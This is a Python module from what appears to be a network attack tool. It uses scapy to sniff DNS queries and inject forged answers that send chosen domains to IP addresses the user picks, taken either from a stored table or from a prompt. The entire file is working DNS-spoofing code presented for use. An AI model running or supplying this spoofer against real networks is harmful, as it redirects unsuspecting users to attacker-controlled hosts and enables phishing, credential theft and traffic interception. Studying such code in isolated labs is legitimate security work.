"""This package contains everything related to DNS spoofing"""

import threading
import time
import click
from scapy.all import DNS, UDP, IP, DNSRR, send, sniff
from functions.domains import get_domains

interface = "udp port 53"

# Global flag to indicate when to stop sniffing
stop_event = threading.Event()

def spoof_dns_all():
    '''
    Main function to spoof all dns domains stored in domains.json
    '''

    table = get_domains()
    click.echo("spoofing target using all stored domains")

    start_attack(table)


def spoof_dns_single():
    '''
    Main function to spoof domain entered by user
    '''

    domain = click.prompt('Which domain do you want to spoof? Please enter the domain without www.')
    ip = click.prompt('Which IP should it route to?')

    start_attack({domain: ip})


def start_attack(table):
    # Start subthread running attack
    attack_thread = threading.Thread(target=attack, args=(table,))
    attack_thread.start()

    try:
        # Wait for keyboard interrupt
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        # Set stop_event when keyboard interrupt occurs
        stop_event.set()
        attack_thread.join()

def attack(table):
    sniff(filter=interface, prn=lambda pkt: analyze_packet(pkt, table), stop_filter=stop_event.is_set())


def analyze_packet(packet, table):
    # check for proper DNS reqs only
    if not packet.haslayer(DNS) or not packet.haslayer(IP):
        return

    # filter out answers
    if packet[DNS].qr != 0:
        return

    query_name = get_packet_query_name(packet[DNS])

    if query_name in table:
        print(f'Found a query to spoof: {query_name}')
        spoof_packet(packet, query_name, table[query_name])
        return


def spoof_packet(packet, spoofed_domain, spoofed_ip):
    # Make DNS template message
    spoofed_reply = IP() / UDP() / DNS()

    # swap source/dest for UDP and IP layers
    spoofed_reply[IP].src = packet[IP].dst
    spoofed_reply[IP].dst = packet[IP].src
    spoofed_reply[UDP].sport = packet[UDP].dport
    spoofed_reply[UDP].dport = packet[UDP].sport

    # copy the ID
    spoofed_reply[DNS].id = packet[DNS].id

    # set query to response
    spoofed_reply[DNS].qr = 1
    spoofed_reply[DNS].aa = 0

    # pass the DNS Question Record to the resposne
    spoofed_reply[DNS].qd = packet[DNS].qd

    # set spoofed answer
    spoofed_reply[DNS].an = DNSRR(rrname=spoofed_domain+'.', rdata=spoofed_ip, type="A", rclass="IN")

    print("Sending spoofed packet")

    send(spoofed_reply)


def get_packet_query_name(dns_packet):
    name = dns_packet.qd.qname[:-1].decode()

    # Remove "www." from the beginning of the name
    if name.startswith("www."):
        name = name[4:]

    return name
